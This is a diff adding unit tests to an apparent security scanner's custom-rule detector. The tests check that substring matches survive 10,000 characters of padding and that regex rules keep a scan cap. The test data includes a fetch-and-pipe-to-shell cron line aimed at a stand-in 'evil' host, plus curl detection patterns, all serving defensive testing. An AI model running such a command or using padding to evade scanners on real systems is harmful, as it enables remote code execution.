@@ -885,3 +885,23 @@ def test_F11_ci_audits_the_lock_and_dependabot_watches_both_ecosystems():
     assert "pip-audit --require-hashes --disable-pip -r requirements.lock" in ci
     bot = yaml.safe_load(open(os.path.join(_REPO, ".github", "dependabot.yml")))
     assert {u["package-ecosystem"] for u in bot["updates"]} == {"pip", "github-actions"}
+
+
+# ─── F-12: substring rules see the whole text ───────────────────────────────
+
+def _custom_rule(match, pattern):
+    from ubuntils.detectors.custom_rules import CustomRule
+    from ubuntils.detectors.finding import Severity
+    return CustomRule(id="X", severity=Severity.HIGH, title="t", description="d",
+                      source="cron", match=match, pattern=pattern)
+
+
+def test_F12_padding_cannot_push_a_substring_match_out_of_view():
+    padded = "A" * 10_000 + " curl http://evil | sh"
+    assert _custom_rule("substring", "curl http://evil").matches("/etc/cron.d/x", padded)
+
+
+def test_F12_regex_rules_keep_the_scan_cap():
+    padded = "A" * 10_000 + " curl http://evil | sh"
+    assert not _custom_rule("regex", r"curl\s+http").matches("/etc/cron.d/x", padded)
+    assert _custom_rule("regex", r"curl\s+http").matches("/etc/cron.d/x", padded[-30:])
